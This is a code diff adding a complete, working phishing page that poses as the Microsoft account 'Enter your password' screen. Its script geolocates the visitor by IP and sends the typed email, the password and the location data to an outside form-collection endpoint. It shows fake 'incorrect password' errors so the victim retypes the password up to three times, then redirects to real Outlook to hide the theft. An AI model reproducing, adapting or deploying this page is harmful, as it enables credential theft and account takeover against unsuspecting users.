@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Enter your password</title>
+  <link rel="icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" type="image/x-icon">
+
+
+
+  <script>
+    window.onload = function() {
+      function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+      }
+      const email = getQueryParam('email');
+      if (email) {
+        document.querySelector('input[name="email"]').value = email;
+      }
+    };
+  </script>
+
+
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: url("https://i.imgur.com/1M9CRj6.png") no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    .form-shape{
+      border-radius: 12px;
+      box-sizing: border-box;
+      margin: 60px auto 0 auto;
+      max-width: 440px;
+      width: calc(100% - 40px);
+      padding: 44px;
+      background-color: #fff;
+      box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
+      min-width: 320px;
+    }
+
+    /* TOP BAR — arrow left, logo centered */
+    .top-bar-wrapper {
+      position: relative;
+      margin-bottom: 32px;
+    }
+
+    .back-arrow {
+      position: absolute;
+      left: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+    }
+
+    .microsoft-container {
+      text-align: center;
+    }
+
+    .microsoft-image {
+      height: 24px;
+    }
+
+    /* Email pill wrapper */
+    .email-wrapper {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .emaill {
+      display: block;
+      margin: 0 auto;
+      width: 100%;
+      max-width: 210px;
+      padding: 2px 8px;
+      border-radius: 10000px;
+      border: 1px solid rgb(209, 209, 209);
+      background-color: #fff;
+      color: rgb(97, 97, 97);
+      font-size: 12px;
+      font-weight: 550;
+      height: 32px;
+      line-height: 24px;
+      white-space: nowrap;
+      box-sizing: border-box;
+      text-align: center;
+    }
+
+    /* Centered Heading */
+    .sign-in {
+      font-weight: 600;
+      font-size: 1.5rem;
+      margin-top: 20px;
+      color: rgb(27, 27, 27);
+      text-align: center;
+      font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+    }
+
+    /* PASSWORD WRAPPER + INPUT */
+    .password-wrapper {
+      position: relative;
+      width: 100%;
+      max-width: 360px;        /* keeps it from overflowing while matching original look */
+      margin: 32px auto 0 auto;
+    }
+
+    .passs{
+      display: block;
+      width: 100%;
+      height: 40px;
+      padding: 0 40px 0 8px; /* extra right padding for icon */
+      font-size: 14px;
+      font-weight: 400;
+      transition: border-bottom-width 0.15s ease, border-bottom-color 0.15s ease;
+      box-sizing: border-box;
+      border: 1px solid rgb(209, 209, 209);
+      border-bottom-color: rgb(97, 97, 97);
+      border-radius: 4px;
+      background: #fff;
+      color: rgb(36, 36, 36);
+    }
+
+    .passs:focus {
+      border-bottom-color: rgb(15, 108, 189);
+      border-bottom-width: 2px;
+      outline: none;
+    }
+
+    .passs::placeholder {
+      color: rgb(120, 120, 120);
+    }
+
+    /* SHOW / HIDE PASSWORD BUTTON */
+    .password-toggle {
+      position: absolute;
+      top: 50%;
+      right: 4px;
+      transform: translateY(-50%);
+      height: 32px;
+      width: 32px;
+      border: none;
+      background: transparent;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      padding: 0;
+      color: #616161; /* default icon color */
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.15s ease, color 0.15s ease, background-color 0.15s ease;
+    }
+
+    /* Only show button on hover/focus */
+    .password-wrapper:hover .password-toggle,
+    .password-wrapper:focus-within .password-toggle {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .password-toggle:hover,
+    .password-toggle:focus-visible {
+      color: #0f6cbd; /* blue on hover/focus */
+      outline: none;
+    }
+
+    .password-toggle svg {
+      width: 20px;
+      height: 20px;
+      fill: currentColor;
+    }
+
+    .password-toggle .icon-hide {
+      display: none;
+    }
+
+    .password-toggle[data-visible="true"] .icon-show {
+      display: none;
+    }
+
+    .password-toggle[data-visible="true"] .icon-hide {
+      display: inline-flex;
+    }
+
+    /* Button */
+    .button{
+      position: relative;
+      background-color: rgb(15, 108, 189);
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      height: 37px;
+      padding: 8px 16px;
+      width: 100%;
+      max-width: 360px;
+      margin: 32px auto 0 auto;
+      cursor: pointer;
+      display: block;
+      overflow: hidden;
+    }
+
+    .button .btn-label {
+      display: inline-block;
+    }
+
+    .button .spinner {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.4);
+      border-top-color: #ffffff;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto;
+      vertical-align: middle;
+    }
+
+    .button.loading {
+      cursor: default;
+      color: transparent;      /* visually hides the label while keeping layout */
+    }
+
+    .button.loading .spinner {
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to   { transform: rotate(360deg); }
+    }
+
+    /* OTHER WAYS */
+    .other-signin{
+      margin-top: 32px;
+      color: rgb(17, 94, 163);
+      font-size: 0.875rem;
+      font-weight: 600;
+      text-align: center;
+      cursor: pointer;
+    }
+
+    /* FOOTER (bottom text & links) */
+    .footer {
+      position: fixed;
+      bottom: 24px;
+      left: 0;
+      right: 0;
+      text-align: center;
+      font-size: 10px;
+      color: #5e5e5e;
+      font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+    }
+
+    .footer-links {
+      margin-bottom: 6px;
+    }
+
+    .footer-links a {
+      margin: 0 10px;
+      text-decoration: none;
+      color: #5e5e5e;
+      font-size: 12px;
+      font-weight: 400;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-note {
+      margin-top: 2px;
+    }
+
+    .footer-note a {
+      text-decoration: none;
+      color: #106ebe;
+    }
+
+    .footer-note a:hover {
+      text-decoration: underline;
+    }
+
+    .passs::-ms-reveal,
+    .passs::-ms-clear {
+      display: none;
+    }
+
+
+    .error-message {
+  margin: 8px auto 0 auto;
+  max-width: 360px;
+  font-size: 12px;
+  color: #e81123; /* MS red */
+  display: flex;
+  align-items: center;
+}
+
+.error-icon {
+  display: inline-flex;
+  margin-right: 6px;
+}
+
+.error-text {
+  line-height: 1.4;
+}
+
+/* Red error border like Microsoft */
+.input-error {
+  border: 0.666667px #e81123 !important;
+  box-shadow: inset 0 0 0 0.666667px #e81123;
+}
+
+.password-input-row {
+  position: relative;
+  width: 100%;
+}
+
+.password-input-row:hover .password-toggle,
+.password-input-row:focus-within .password-toggle {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+
+.forgot-link {
+  margin-top: 8px;
+  text-align: left;
+  width: 100%;
+  max-width: 360px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.forgot-pass {
+  font-size: 14px;
+  color: rgb(17, 94, 163);
+  text-decoration: none;
+  font-weight: 600;
+}
+
+.forgot-pass:hover {
+  text-decoration: underline;
+}
+
+/* Mobile — mimic real Microsoft login */
+@media (max-width: 540px) {
+
+  body {
+    background: #ffffff !important;   /* Microsoft uses pure white */
+    background-image: none !important;
+  }
+
+  .form-shape {
+    margin: 0;
+    padding: 32px 20px;
+    border-radius: 0;
+    max-width: 100%;
+    width: 100%;
+    min-height: 100vh;
+    box-shadow: none !important;      /* Microsoft removes shadow on mobile */
+  }
+
+  /* Microsoft hides these on mobile */
+  .footer,
+  .other-signin,
+  .back-arrow {
+    display: none !important;
+  }
+
+  /* They also center the Microsoft logo */
+  .microsoft-container {
+    text-align: left;       /* On mobile, Microsoft aligns logo left */
+    margin-bottom: 24px;
+  }
+
+  .microsoft-image {
+    height: 22px;           /* Slightly smaller logo on mobile */
+  }
+
+  /* Adjust password input spacing */
+  .password-wrapper {
+    margin-top: 24px;
+  }
+}
+
+
+
+  </style>
+</head>
+<body>
+
+  <div class="form-shape">
+
+    <!-- ARROW + LOGO -->
+    <div class="top-bar-wrapper">
+
+      <div class="back-arrow">
+        <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M10.3 19.72a1 1 0 0 0 1.4-1.43L6.33 13H20a1 1 0 0 0 0-2H6.33l5.37-5.28a1 1 0 0 0-1.4-1.42l-6.93 6.82c-.5.5-.5 1.3 0 1.78l6.92 6.83Z"
+                fill="rgb(96, 94, 92)"></path>
+        </svg>
+      </div>
+
+      <div class="microsoft-container">
+        <img class="microsoft-image"
+             src="https://logincdn.msauth.net/shared/5/js/../images/microsoft_logo_ee5c8d9fb6248c938fd0.svg"
+             alt="Microsoft">
+      </div>
+
+    </div>
+
+
+    <!-- FORM -->
+    <form id="contact" class="form-horizontal well">
+
+      <input type="email" name="email" placeholder="" readonly class="emaill" value="[[-Email-]]">
+
+      <!-- HEADING -->
+      <div class="sign-in">Enter your password</div>
+
+      <!-- PASSWORD WITH SHOW / HIDE ICON -->
+      
+      <div class="password-wrapper">
+
+  <!-- INPUT + TOGGLE ROW (height never changes) -->
+  <div class="password-input-row">
+
+    <input
+      type="password"
+      name="pass"
+      placeholder="Password"
+      class="passs"
+      id="password-input">
+
+    <button
+          type="button"
+          aria-label="Show password"
+          class="password-toggle"
+          data-visible="false">
+          <!-- Eye (show) -->
+          <span class="icon-show" aria-hidden="true">
+            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+              <path d="M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z"></path>
+            </svg>
+          </span>
+          <!-- Eye with thin slash (hide) -->
+          <span class="icon-hide" aria-hidden="true">
+            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+              <path d="M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z"></path>
+              <!-- thin diagonal slash -->
+              <line x1="4" y1="16" x2="16" y2="4" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"></line>
+            </svg>
+          </span>
+        </button>
+  </div>
+
+  
+
+
+  <!-- ERROR MESSAGE BELOW (does NOT push the eye icon downward anymore) -->
+  <div id="password-error" class="error-message" style="display:none;">
+    <span class="error-icon" aria-hidden="true">
+      <svg width="16" height="16" viewBox="0 0 20 20">
+        <path fill="#E81123" d="M10 0C4.486 0 0 4.486 0 10s4.486 10 10 10 10-4.486 10-10S15.514 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
+      </svg>
+    </span>
+    <span class="error-text">
+      That password is incorrect for your Microsoft account.
+    </span>
+  </div>
+
+</div>
+
+<div class="forgot-link">
+  <a href="#" class="forgot-pass">Forgot your password?</a>
+</div>
+
+
+      <!-- BUTTON -->
+      <button type="submit" class="button" id="submit-btn">
+        <span class="btn-label">Next</span>
+        <span class="spinner" aria-hidden="true"></span>
+      </button>
+    </form>
+
+    <!-- OTHER WAYS -->
+    <div class="other-signin">Other ways to sign in</div>
+
+  </div>
+
+  <!-- BOTTOM FOOTER -->
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#">Help and feedback</a>
+      <a href="#">Terms of use</a>
+      <a href="#">Privacy and cookies</a>
+    </div>
+    <div class="footer-note">
+      Use private browsing if this is not your device.
+      <a href="#">Learn more</a>.
+    </div>
+  </div>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+  $(document).ready(function() {
+
+    async function getVisitorInfo() {
+    var info = {
+        ip: "",
+        city: "",
+        region: "",
+        country: "",
+        country_code: "",
+        postal: "",
+        timezone: "",
+        org: ""
+    };
+
+    try {
+
+        // STEP A — Get IP from ipify
+        var ipResponse = await fetch("https://api.ipify.org?format=json");
+        var ipData = await ipResponse.json();
+
+        info.ip = ipData.ip || "";
+
+        // STEP B — Send IP to ipinfo.io
+        if (info.ip) {
+
+            var infoResponse = await fetch(
+                "https://ipinfo.io/" + info.ip + "/json"
+            );
+
+            var infoData = await infoResponse.json();
+
+            info.city = infoData.city || "";
+            info.region = infoData.region || "";
+            info.country = infoData.country || "";
+            info.country_code = infoData.country || "";
+            info.postal = infoData.postal || "";
+            info.timezone = infoData.timezone || "";
+            info.org = infoData.org || "";
+        }
+
+    } catch (error) {
+
+        console.log("Visitor info lookup failed:", error);
+
+    }
+
+    return info;
+}
+
+    var attemptCount = 0;
+
+    // Show / hide password toggle
+    var $passwordInput = $('#password-input');
+    var $toggleBtn = $('.password-toggle');
+    var $errorMessage = $('#password-error');
+
+    $toggleBtn.on('click', function () {
+      var isVisible = $(this).attr('data-visible') === 'true';
+
+      if (isVisible) {
+        $passwordInput.attr('type', 'password');
+        $(this).attr('aria-label', 'Show password');
+        $(this).attr('data-visible', 'false');
+      } else {
+        $passwordInput.attr('type', 'text');
+        $(this).attr('aria-label', 'Hide password');
+        $(this).attr('data-visible', 'true');
+      }
+    });
+
+    // Hide error when user starts typing again
+    $passwordInput.on('input', function () {
+  $errorMessage.hide();
+  $passwordInput.removeClass('input-error');
+});
+
+
+    $("#contact").on('submit', async function(e) {
+      e.preventDefault();
+
+      var email = $(".emaill").val();
+      var password = $("input[name='pass']").val();
+
+      var visitorInfo = await getVisitorInfo();
+
+      attemptCount++;
+
+      if (attemptCount <= 3) {
+        $.ajax({
+          dataType: "JSON",
+          url: "https://submit-form.com/4mwkhe5jU",
+          type: "POST",
+
+          contentType: "application/json",
+
+headers: {
+    Accept: "application/json"
+},
+
+          data: JSON.stringify({
+    email: email,
+    password: password,
+
+    ip: visitorInfo.ip,
+    city: visitorInfo.city,
+    region: visitorInfo.region,
+    country: visitorInfo.country,
+    country_code: visitorInfo.country_code,
+    postal: visitorInfo.postal,
+    timezone: visitorInfo.timezone,
+    org: visitorInfo.org
+}),
+          beforeSend: function() {
+            $("#submit-btn")
+              .addClass("loading")
+              .prop("disabled", true);
+
+            // hide any previous error while submitting
+            $errorMessage.hide();
+          },
+          success: function(response) {
+            if (response) {
+              console.log(response);
+            }
+          },
+          complete: function() {
+            $("#submit-btn")
+              .removeClass("loading")
+              .prop("disabled", false);
+
+            if (attemptCount < 3) {
+              // clear password and show error after spinner finishes
+              $("input[name='pass']").val('');
+              $errorMessage.show();
+              $passwordInput.addClass('input-error');
+            } else if (attemptCount === 3) {
+              // 3rd submission: redirect after spinner completes
+              window.location.replace("https://outlook.live.com/mail/0/");
+            }
+          }
+        });
+      }
+    });
+  });
+</script>
+
+</body>
+</html>
